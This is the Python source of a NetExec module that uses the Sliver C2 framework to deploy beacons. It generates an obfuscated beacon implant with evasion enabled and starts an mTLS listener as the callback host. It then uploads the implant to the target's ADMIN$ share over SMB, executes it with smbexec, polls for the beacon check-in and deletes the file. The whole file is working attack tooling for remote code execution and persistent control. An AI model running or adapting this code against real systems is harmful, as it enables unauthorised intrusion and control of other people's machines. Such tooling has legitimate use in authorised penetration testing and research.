import time
import sys
import os
import asyncio
import tempfile
import secrets
import string
import threading
import queue
import logging
from nxc.helpers.misc import CATEGORY

try:
    from sliver import SliverClientConfig, SliverClient
    from sliver.pb.clientpb import client_pb2 as clientpb
except ImportError:
    raise ImportError("sliver-py not installed. Hint: pipx inject netexec sliver-py")


class GrpcWorker:
    """
    Dedicated worker thread for gRPC operations with persistent event loop.
    """

    def __init__(self):
        self.task_queue = queue.Queue()
        self.result_queue = queue.Queue()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
        self.client = None
        self.config_path = None
        self.connected = False

    def _run_loop(self):
        """Main worker loop that processes gRPC tasks."""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        while True:
            try:
                task = self.task_queue.get(timeout=1.0)
            except queue.Empty:
                continue  # No task yet; keep polling without error
            if task is None:  # Shutdown signal
                break

            try:
                method_name, args, kwargs = task
                method = getattr(self, f'_do_{method_name}')
                result = loop.run_until_complete(method(*args, **kwargs))
                self.result_queue.put(('success', result))
            except Exception as e:
                self.result_queue.put(('error', e))
            finally:
                self.task_queue.task_done()

    def submit_task(self, method_name, *args, **kwargs):
        """Submit a task to the worker thread."""
        self.task_queue.put((method_name, args, kwargs))
        status, result = self.result_queue.get()
        if status == 'error':
            raise result
        return result

    async def _do_connect(self, config_path):
        """Connect to Sliver server."""
        if self.client is None or self.config_path != config_path:
            cfg = SliverClientConfig.parse_config_file(config_path)
            if not all([cfg.ca_certificate, cfg.certificate, cfg.private_key]):
                raise ValueError("Sliver config missing certificates")

            self.client = SliverClient(cfg)
            self.config_path = config_path

        if not self.connected:
            await self.client.connect()
            self.connected = True

        return self.client

    async def _do_jobs(self):
        """Get list of jobs/listeners."""
        client = await self._do_connect(self.config_path)
        return await client.jobs()

    async def _do_start_mtls_listener(self, host, port):
        """Start mTLS listener."""
        client = await self._do_connect(self.config_path)
        await client.start_mtls_listener(host, port)

    async def _do_implant_profiles(self):
        """Get list of implant profiles."""
        client = await self._do_connect(self.config_path)
        return await client.implant_profiles()

    async def _do_save_implant_profile(self, profile_pb):
        """Save an implant profile."""
        client = await self._do_connect(self.config_path)
        return await client.save_implant_profile(profile_pb)

    async def _do_generate_implant(self, ic):
        """Generate a Sliver implant from ImplantConfig."""
        client = await self._do_connect(self.config_path)

        resp = await client.generate_implant(ic)
        if not resp.File or not resp.File.Data:
            raise ValueError(f"Failed to generate implant: {resp.Err or 'unknown'}")
        return resp

    async def _do_beacons(self):
        """Get list of beacons."""
        client = await self._do_connect(self.config_path)
        return await client.beacons()

    async def _do_sessions(self):
        """Get list of sessions."""
        client = await self._do_connect(self.config_path)
        return await client.sessions()

    def shutdown(self):
        """Shutdown the worker thread."""
        self.task_queue.put(None)
        self.thread.join(timeout=5.0)


class NXCModule:
    """
    NetExec module for generating and executing unique Sliver beacons on remote targets via SMB.
    """
    name = "sliver_exec"
    description = "Generates unique Sliver beacon and executes on target"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = False
    category = CATEGORY.PRIVILEGE_ESCALATION

    # Single shared worker for all instances (fixes multi-thread gRPC poller races)
    _shared_worker = None

    @classmethod
    def _get_shared_worker(cls):
        if cls._shared_worker is None:
            cls._shared_worker = GrpcWorker()
        return cls._shared_worker

    def __init__(self):
        """Initialize module state and logging."""
        # logging.getLogger("nxc").setLevel(logging.DEBUG)

        # Suppress gRPC poller cleanup race errors (grpc/grpc#34139)
        # A cleanup race where the poller reader isn't unregistered from the event loop before socket closure,
        class SuppressPollerErrorFilter(logging.Filter):
            def filter(self, record):
                # Suppress gRPC poller races (non-fatal)
                if 'PollerCompletionQueue._handle_events' in record.getMessage() and 'BlockingIOError' in str(record.exc_info):
                    return False
                return True

        # Apply to asyncio and gRPC loggers
        logging.getLogger('asyncio').addFilter(SuppressPollerErrorFilter())
        logging.getLogger('grpc').addFilter(SuppressPollerErrorFilter())

        # Configuration options
        self.implant_base_path = None
        self.format = None
        self.extension = None
        self.wait_seconds = 90
        self.rhost = None
        self.rport = None
        self.cleanup = True
        self.os_type = None
        self.arch = None
        self.share_config = None
        self.config_path = None
        self.profile = None
        # Runtime state
        self.full_path = None
        self.share = None
        self.smb_path = None

    def options(self, context, module_options):
        """
        Parse and validate module options from NetExec.
        Called by NetExec framework before on_admin_login.
        """
        self._validate_required_options(context, module_options)
        self._parse_module_options(context, module_options)
        self._load_sliver_config(context)

    def _validate_required_options(self, context, module_options):
        """
        Ensure required options are provided and valid.
        Exits if missing or invalid.
        """
        # Known options
        known_options = {
            "IMPLANT_BASE_PATH", "RHOST", "RPORT", "CLEANUP", "OS", "ARCH",
            "SHARE", "PROFILE", "WAIT", "FORMAT"
        }

        # Check for unknown options
        for key in module_options:
            if key not in known_options:
                context.log.fail(f"Unknown option: {key}")
                sys.exit(1)

        # Acceptable option sets:
        #  - RHOST + RPORT (remote host mode)
        #  - PROFILE (use existing profile)
        has_rhost = bool(module_options.get("RHOST") is not None and module_options.get("RPORT") is not None)
        # PROFILE alone
        has_profile = bool(module_options.get("PROFILE") is not None)

        if not (has_rhost or has_profile):
            context.log.fail("Either RHOST+RPORT OR PROFILE must be provided")
            sys.exit(1)

        # If RHOST/RPORT provided, validate them
        if has_rhost:
            # Validate RHOST is a valid IPv4 address
            import ipaddress
            try:
                ipaddress.IPv4Address(module_options["RHOST"])
            except ipaddress.AddressValueError:
                context.log.fail(f"RHOST must be a valid IPv4 address: {module_options['RHOST']}")
                sys.exit(1)

            # Validate RPORT is a valid port number (1-65535)
            try:
                port = int(module_options["RPORT"])
                if not (1 <= port <= 65535):
                    raise ValueError()
            except (ValueError, TypeError):
                context.log.fail(f"RPORT must be a valid port number (1-65535): {module_options['RPORT']}")
                sys.exit(1)

        # If PROFILE provided, validate simple presence (more validation occurs later)
        if has_profile:
            if not module_options.get("PROFILE"):
                context.log.fail("PROFILE cannot be empty")
                sys.exit(1)

    def _parse_module_options(self, context, module_options):
        """
        Parse all module options and set instance variables.
        """
        self.implant_base_path = module_options.get("IMPLANT_BASE_PATH", "/tmp")
        if not os.path.exists(self.implant_base_path):
            context.log.warning(f"IMPLANT_BASE_PATH {self.implant_base_path} does not exist locally.")
        # RHOST/RPORT may be absent when using PROFILE+LISTENER mode
        self.rhost = module_options.get("RHOST", None)
        self.rport = int(module_options["RPORT"]) if "RPORT" in module_options and module_options.get("RPORT") is not None else None
        self.cleanup = module_options.get("CLEANUP", "True").lower() in ("true", "1", "yes")
        self.os_type = module_options.get("OS", None)
        self.arch = module_options.get("ARCH", None)
        self.share_config = module_options.get("SHARE", None)
        self.wait_seconds = int(module_options.get("WAIT", "90"))
        # PROFILE mode
        self.profile = module_options.get("PROFILE", None)
        if self.profile:
            context.log.display(f"Using Sliver profile: {self.profile}")
        fmt = module_options.get("FORMAT", "exe").lower()
        if fmt not in ["exe", "executable"]:
            context.log.fail("Only EXECUTABLE format supported. Use: exe")
            sys.exit(1)
        self.format, self.extension = ("EXECUTABLE", "exe")

    def _load_sliver_config(self, context):
        """
        Load Sliver client config from [Sliver] section or default path.
        Exits if config file missing.
        """
        self.config_path = context.conf.get(
            "Sliver", "config_path",
            fallback=os.path.expanduser("~/.sliver-client/configs/default.cfg")
        )
        if not os.path.exists(self.config_path):
            context.log.fail(f"Sliver config not found: {self.config_path}")
            sys.exit(1)

    def _fatal(self, context, msg):
        """Log fatal message and exit (keeps existing behavior)."""
        context.log.fail(msg)
        sys.exit(1)

    def _get_worker_and_connect(self):
        """Return shared GrpcWorker and ensure it's connected to current config."""
        worker = self.__class__._get_shared_worker()
        worker.submit_task('connect', self.config_path)
        return worker

    def _worker_submit(self, method, *args, **kwargs):
        """Convenience wrapper to ensure worker is connected then submit a task."""
        # The caller should ensure connection with `_get_worker_and_connect()` when needed.
        worker = self.__class__._get_shared_worker()
        return worker.submit_task(method, *args, **kwargs)

    def _get_listener_by_id(self, listener_id):
        """Return listener proto object by ID or None."""
        jobs = self._worker_submit('jobs')
        return next((j for j in jobs if getattr(j, 'ID', '') == listener_id), None)

    def _find_listener(self, protocol=None, port=None, name=None):
        """Find a listener by optional protocol, port and name.
        Returns the first matching listener proto or None.
        """
        jobs = self._worker_submit('jobs')

        def _match(j):
            if protocol and getattr(j, "Protocol", "").lower() != protocol.lower():
                return False
            if port is not None and getattr(j, "Port", 0) != int(port):
                return False
            if name is not None and getattr(j, "Name", "") != name:
                return False
            return True

        return next((j for j in jobs if _match(j)), None)

    def _build_c2_url_from_listener(self, listener_pb):
        """Build a C2 URL string from a listener protobuf-like object."""
        proto = getattr(listener_pb, 'Protocol', 'tcp').lower()
        host = getattr(listener_pb, 'Host', self.rhost)
        port = getattr(listener_pb, 'Port', self.rport)

        if proto == 'tcp':
            return f"mtls://{host}:{port}"
        elif proto == 'http':
            return f"http://{host}:{port}"
        elif proto == 'https':
            return f"https://{host}:{port}"
        else:
            raise ValueError(f"Unsupported listener protocol: {proto}")

    def _ensure_default_mtls_listener(self, context):
        """Ensure a default mTLS listener is available on `self.rhost:self.rport`.
        Returns the listener object (proto) if found/created, else raises ValueError.
        """
        # First, check for an existing tcp listener with Name==mtls on the port
        existing = self._find_listener(protocol="tcp", port=self.rport, name="mtls")
        if not existing:
            try:
                self._worker_submit('start_mtls_listener', self.rhost, self.rport)
                context.log.info(f"Started default mTLS listener on {self.rhost}:{self.rport}")
            except Exception as listener_e:
                if "address already in use" in str(listener_e).lower():
                    context.log.warning(f"mTLS port {self.rport} in use (non-Sliver process?); assuming usable or pre-started.")
                else:
                    raise listener_e

        # Re-fetch after creation to get ID (expect an active mTLS listener)
        default_listener = self._find_listener(protocol="tcp", port=self.rport, name="mtls")
        if not default_listener:
            raise ValueError("Failed to start default mTLS listener")
        return default_listener

    def on_admin_login(self, context, connection):
        """
        Main module execution entry point.
        Called by NetExec on admin login.
        """
        pass

    def on_login(self, context, connection):
        """
        Alternative entry point for regular login.
        """
        self._run_beacon(context, connection)

    def _run_beacon(self, context, connection):
        """
        Core beacon execution logic.
        1. Detect OS/arch
        2. Generate unique implant name
        3. Generate Sliver beacon
        4. Upload to target via SMB
        5. Execute
        6. Wait & cleanup
        """
        host = connection.host
        os_type, arch = self._detect_os_arch(context, connection)
        implant_name = self._generate_implant_name()
        implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
        tmp_path = self._save_implant_to_temp(implant_data)
        self.local_implant_path = tmp_path

        try:
            remote_path, share, smb_path = self._determine_remote_paths(os_type, implant_name)
            self.remote_implant_path = remote_path
            self.remote_share = share
            self.smb_path = smb_path
            self._increase_smb_timeout(connection)
            if not self._upload_implant_via_smbexec(context, connection, tmp_path, remote_path, share, os_type):
                sys.exit(1)
            context.log.info(f"Uploaded to \\\\{host}\\{share}\\{implant_name}")
            self._execute_implant(context, connection, remote_path, os_type)

            if self.cleanup:
                self._wait_and_cleanup(context, connection, remote_path, os_type, implant_name)
            else:
                context.log.info("Cleanup skipped (CLEANUP=False)")

        finally:
            self._cleanup_local_temp(tmp_path)

    def _detect_os_arch(self, context, connection):
        """
        Detect target OS and architecture.
        Uses connection attributes or manual parsing.
        Falls back to user-specified OS/ARCH options.
        Exits on failure.
        """
        # Start with user-specified
        os_type = self.os_type
        arch = self.arch

        # If profile specified, log override but still detect for validation
        if self.profile:
            context.log.display(f"Profile '{self.profile}' overrides detected OS/arch for generation.")

        # Detect OS if not specified
        if os_type is None:
            os_info = getattr(connection, "server_os", None)
            if not os_info:
                context.log.fail("Could not detect OS. Use -o OS=windows|linux")
                sys.exit(1)

            os_info_lower = str(os_info).lower()
            # Assume "unix" and "samba" are equivalent to "linux"
            os_type = "windows" if "windows" in os_info_lower else "linux" if any(x in os_info_lower for x in ["linux", "unix", "samba"]) else None
            if os_type is None:
                context.log.fail(f"Unsupported OS: {os_info}")
                sys.exit(1)

            context.log.debug(f"Detected OS: {os_type.title()}")

        # Detect arch if not specified
        if arch is None:
            arch_info = getattr(connection, "os_arch", None)
            if arch_info is None and os_info:  # Fallback to parsing server_os
                os_info_lower = str(os_info).lower()
                if any(x in os_info_lower for x in ["x64", "amd64", "64-bit"]):
                    arch_info = "amd64"
                elif any(x in os_info_lower for x in ["x86", "32-bit"]):
                    arch_info = "386"

            if arch_info is None:
                arch = "amd64"  # Default to x64 when architecture cannot be detected
            else:
                arch_info_lower = str(arch_info).lower()
                arch = "amd64" if any(x in arch_info_lower for x in ("64", "x86_64", "amd64")) else "386"
            context.log.debug(f"Detected arch: {arch}")
        else:
            context.log.display(f"Using specified arch: {arch}")

        # Final validation
        if os_type not in ("windows", "linux"):
            context.log.fail(f"Invalid OS: {os_type}")
            sys.exit(1)
        if arch not in ("amd64", "386"):
            context.log.fail(f"Invalid ARCH: {arch}")
            sys.exit(1)

        context.log.info(f"Using: {os_type.title()} {arch}")
        return os_type, arch

    def _generate_implant_name(self):
        """
        Generate unique implant filename with random 8-char suffix.
        Format: implant_<random>.<extension>
        """
        random_suffix = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))
        implant_name = f"implant_{random_suffix}.{self.extension}"
        return implant_name

    def _build_default_implant_config(self, os_type, arch, implant_name, c2_url):
        """
        Build ImplantConfig with current hardcoded defaults.
        """
        ic = clientpb.ImplantConfig()
        ic.Name = implant_name
        ic.GOOS = os_type
        ic.GOARCH = arch
        ic.Format = clientpb.OutputFormat.Value(self.format)
        ic.IsBeacon = True
        ic.BeaconInterval = 5 * 1_000_000_000  # 5s in ns
        ic.BeaconJitter = 3 * 1_000_000_000   # 3s in ns
        ic.Debug = False
        ic.ObfuscateSymbols = True
        if os_type == "windows":
            ic.Evasion = True

        c2 = ic.C2.add()
        c2.URL = c2_url
        c2.Priority = 0
        return ic

    def _build_ic_from_profile(self, context, os_type, arch, implant_name):
        """Validate and build ImplantConfig from an existing profile."""
        profiles = self._worker_submit('implant_profiles')
        profile_pb = next((p for p in profiles if getattr(p, 'Name', None) == self.profile), None)
        if not profile_pb:
            context.log.fail(f"Profile '{self.profile}' not found.")
            sys.exit(1)

        # Check if profile platform matches detected host OS/arch
        if profile_pb.Config.GOOS != os_type or profile_pb.Config.GOARCH != arch:
            context.log.fail("Profile incompatible with host")
            sys.exit(1)

        ic_local = clientpb.ImplantConfig()
        ic_local.CopyFrom(profile_pb.Config)
        ic_local.Name = implant_name
        ic_local.GOOS = os_type
        ic_local.GOARCH = arch
        ic_local.Format = clientpb.OutputFormat.Value(self.format)

        context.log.info(f"Generating from profile {self.profile}")
        return ic_local

    def _build_ic_default(self, context, os_type, arch, implant_name):
        """Build default ImplantConfig and attempt to reuse or save a profile."""
        default_listener = self._ensure_default_mtls_listener(context)
        c2_url = self._build_c2_url_from_listener(default_listener)
        ic_local = self._build_default_implant_config(os_type, arch, implant_name, c2_url)
        profiles = self._worker_submit('implant_profiles')

        def _matches(p):
            try:
                has_c2 = bool(p.Config.C2)
                return (
                    p.Config.GOOS == os_type
                    and p.Config.GOARCH == arch
                    and p.Config.Format == ic_local.Format
                    and p.Config.ObfuscateSymbols == ic_local.ObfuscateSymbols
                    and p.Config.IsBeacon == ic_local.IsBeacon
                    and (p.Config.C2[0].URL == c2_url if has_c2 else False)
                )
            except Exception:
                return False

        matching_profile = next((p for p in profiles if _matches(p)), None)
        if matching_profile:
            context.log.info(f"Reusing matching default profile: {matching_profile.Name}")
        else:
            profile_name = f"nxc_default_{secrets.token_hex(4)}"
            profile_pb = clientpb.ImplantProfile()
            profile_pb.Name = profile_name
            profile_pb.Config.CopyFrom(ic_local)
            try:
                saved_profile = self._worker_submit('save_implant_profile', profile_pb)
                context.log.info(f"Created default profile: {saved_profile.Name}")
            except Exception as e:
                context.log.warning(f"Failed to save default profile '{profile_name}': {e}")

        return ic_local

    def _get_listener_c2_url(self, listener):
        """
        Lookup listener by ID and build C2 URL.
        """
        listener_pb = self._get_listener_by_id(listener)
        if not listener_pb:
            raise ValueError(f"Listener ID {listener} not found")
        return self._build_c2_url_from_listener(listener_pb)

    def _generate_sliver_implant(self, context, os_type, arch, implant_name):
        """
        Connect to Sliver gRPC, use provided IDs or create default mTLS/profile, generate beacon implant.
        Returns raw implant bytes.
        Exits on failure.
        """
        try:
            # Ensure worker is connected
            _ = self._get_worker_and_connect()
            context.log.info("Connected to Sliver gRPC")

            if self.profile:
                ic = self._build_ic_from_profile(context, os_type, arch, implant_name)
            else:
                ic = self._build_ic_default(context, os_type, arch, implant_name)

            # Generate implant
            context.log.display(f"Generating Sliver {os_type}/{arch} {self.format.lower()}...")
            resp = self._worker_submit('generate_implant', ic)
            context.log.info("Implant generated")
            context.log.debug(f"Implant generated is ({len(resp.File.Data)} bytes)")            
            return resp.File.Data
        except Exception as e:
            context.log.fail(f"Failed to generate implant: {e}")
            sys.exit(1)

    def _save_implant_to_temp(self, implant_data):
        """
        Save implant bytes to local temporary file.
        Returns temp file path for upload.
        """
        tmp_file = tempfile.NamedTemporaryFile(delete=False, suffix=f".{self.extension}")
        tmp_file.write(implant_data)
        tmp_file.close()
        return tmp_file.name

    def _determine_remote_paths(self, os_type, implant_name):
        """
        Determine full path, SMB-relative path, and share for target.
        Windows: C:\\Windows\\Temp\\file.exe → ADMIN$\\Windows\\Temp\\file.exe
        Linux: share_root/implant_xxx.exe (using "linux" share by default)
        Returns (full_path, share, smb_path)
        """
        if os_type == "windows":
            full_path = f"C:\\Windows\\Temp\\{implant_name}"
            smb_path = f"Windows\\Temp\\{implant_name}"
            share = self.share_config or "ADMIN$"
        else:
            full_path = f"/linux_share_root/{implant_name}"  # For logging/exec;
            smb_path = implant_name  # Relative to share root
            share = self.share_config or "linux"
        return full_path, share, smb_path

    def _increase_smb_timeout(self, connection):
        """
        Set SMB connection timeout to 300s (5 min) for large uploads.
        """
        connection.conn.setTimeout(300)

    def _upload_implant_via_smbexec(self, context, connection, local_path, remote_path, share, os_type):
        """
        Direct upload. Uses correct SMB-relative path.
        """
        context.log.info("Uploading implant directly via SMB (putFile)...")

        if os_type == "windows":
            # Remove leading C:\Windows\ (case-insensitive) to get SMB-relative path.
            if remote_path.lower().startswith("c:\\windows\\"):
                smb_path = "\\" + remote_path[len("C:\\Windows\\"):]
            else:
                smb_path = remote_path
        else:
            smb_path = self.smb_path

        remote_dir = smb_path.rsplit("\\", 1)[0] if "\\" in smb_path else smb_path.rsplit("/", 1)[0]

        try:
            if remote_dir and remote_dir != "":  # Skip mkdir for root/empty dir
                # Only attempt remote mkdir via smbexec on Windows targets. For Linux targets skip mkdir.
                if os_type == "windows":
                    mkdir_cmd = f'mkdir "{remote_dir}" 2>nul'
                    try:
                        connection.execute(mkdir_cmd, methods=["smbexec"])
                    except Exception as mk_e:
                        context.log.debug(f"Mkdir skipped (exec fail): {mk_e}")
                else:
                    context.log.debug("Skipping remote mkdir via smbexec on Linux target; will upload file directly")

            # Refresh connection to handle stale NETBIOS sessions, especially on Linux/Samba hosts
            # which can drop connections during multi-target parallelism + proxychains latency
            connection.conn.reconnect()
            # Upload implant
            connection.conn.putFile(share, smb_path, open(local_path, "rb").read)
            context.log.success("Implant SMB upload complete")
            return True
        except Exception as e:
            context.log.fail(f"Direct upload failed: {e}")
            return False

    def _execute_implant(self, context, connection, remote_path, os_type):
        """
        Execute EXE implant directly (EXECUTABLE only).
        """
        context.log.debug("Executing implant...")
        # SMB execute is only supported on Windows targets in this module.
        if os_type != "windows":
            context.log.fail("SMB execute is not supported on Linux targets; skipping remote execution")
            return False

        exec_cmd = f'cmd /c "{remote_path}"'
        try:
            connection.execute(exec_cmd, methods=["smbexec"])
            context.log.info(f"Executed: {remote_path}")
            return True
        except Exception as e:
            context.log.warning(f"Execution failed: {e}")
            return False

    def _wait_and_cleanup(self, context, connection, remote_path, os_type, implant_name):
        """
        Wait for beacon via Sliver polling, then cleanup.
        Falls back to timeout if polling fails.
        """

        if os_type != "windows":
            return False

        if not self._wait_for_beacon(context, implant_name, timeout=self.wait_seconds):
            context.log.display("Beacon not detected within timeout — cleaning up anyway")

        # Always cleanup remote file
        cleanup_cmd = f'del /f /q "{remote_path}"' if os_type == "windows" else f'rm -f "{remote_path}"'
        try:
            connection.execute(cleanup_cmd, methods=["smbexec"])
            context.log.info("Cleaned up remote implant")
        except Exception as e:
            context.log.warning(f"Cleanup failed: {e}")

    def _wait_for_beacon(self, context, implant_name, timeout=30):
        """
        Poll Sliver gRPC for beacon or session check-in.
        Returns True if beacon or session connects within timeout, else False.
        """
        context.log.info(f"Waiting up to {timeout}s for beacon or session check-in...")

        # Ensure connected before polling
        worker = self.__class__._get_shared_worker()
        try:
            worker.submit_task('connect', self.config_path)
            context.log.debug("Re/connected to Sliver for polling")
        except Exception as e:
            context.log.warning(f"Connect failed before polling: {e}")

        start_time = time.time()
        poll_attempts = 0

        try:
            while time.time() - start_time < timeout:
                poll_attempts += 1
                try:
                    beacons = worker.submit_task('beacons')
                    sessions = worker.submit_task('sessions')
                    context.log.debug(f"Poll {poll_attempts}: Got {len(beacons)} beacons, {len(sessions)} sessions")
                except Exception as poll_e:
                    context.log.warning(f"Poll {poll_attempts} failed: {type(poll_e).__name__}: {poll_e}")
                    beacons = []
                    sessions = []

                for beacon in beacons:
                    if beacon.Name.startswith(implant_name):
                        context.log.success(f"Beacon connected! ID: {beacon.ID}, Name: {beacon.Name}")
                        return True

                for session in sessions:
                    if session.Name.startswith(implant_name):
                        context.log.success(f"Session connected! ID: {session.ID}, Name: {session.Name}")
                        return True

                context.log.debug(f"Poll {poll_attempts} no match; sleeping 1s (elapsed: {time.time() - start_time:.1f}s)")
                time.sleep(1)

            context.log.debug(f"Timeout after {poll_attempts} polls")
            return False
        except Exception as e:
            context.log.warning(f"Unexpected polling error: {type(e).__name__}: {e}")
            return False

    def _cleanup_local_temp(self, tmp_path):
        """
        Always cleanup local temp implant file.
        """
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.unlink(tmp_path)
            except Exception:
                pass

    def cleanup(self):
        """
        Cleanup module resources, including shutting down the gRPC worker thread.
        """
        if self.__class__._shared_worker is not None:
            self.__class__._shared_worker.shutdown()
